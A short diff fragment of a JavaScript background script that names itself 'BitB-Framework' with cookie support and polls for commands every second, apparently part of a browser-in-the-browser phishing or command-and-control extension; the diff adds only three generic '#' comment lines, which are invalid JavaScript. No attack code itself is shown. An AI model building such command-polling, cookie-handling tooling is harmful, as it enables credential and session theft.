@@ -71,3 +71,7 @@ async function pollCommands() {
 setInterval(pollCommands, 1000);
 
 console.log("✅ BitB-Framework Background Script Loaded (Cookies Support Added)");
+
+# Update on 2026-09-17 22:38:42
+# Additional handling and logging improvements
+# Refined logic for better reliability
